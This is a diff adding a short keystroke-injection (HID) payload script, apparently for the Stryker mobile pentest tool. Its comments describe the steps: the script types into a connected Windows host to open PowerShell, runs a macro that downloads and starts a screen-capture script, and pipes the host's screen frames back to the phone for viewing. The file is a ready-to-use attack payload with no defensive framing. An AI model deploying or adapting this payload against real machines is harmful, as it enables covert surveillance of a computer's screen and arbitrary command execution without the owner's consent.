@@ -1,0 +1,32 @@
+REM ============================================================
+REM  Screen-capture showcase — Stryker's flagship HID demo.
+REM ============================================================
+REM
+REM  What this payload does, step by step:
+REM    1. Opens a PowerShell window on the host (Win+R · "powershell").
+REM    2. STARTSCREEN expands to a one-line launcher that downloads /
+REM       starts the host-side screen feed script and pipes JPEG
+REM       frames back to Stryker over the CDC ACM gadget.
+REM    3. SCREEN opens the on-phone fullscreen viewer; frames render
+REM       as soon as the host pipeline is ready.
+REM
+REM  Requirements:
+REM    · USB Arsenal profile "HID-to-Go" or "Back-Channel Bridge"
+REM      is auto-applied by Run.
+REM    · Host must be on a profile that exposes /dev/ttyGS0 to
+REM      Stryker (handled by the same profile above).
+REM
+REM  Tweakables: bump the DELAYs if your host is slow to wake up.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+ENTER
+DELAY 1500
+
+STARTSCREEN
+DELAY 1500
+
+SCREEN
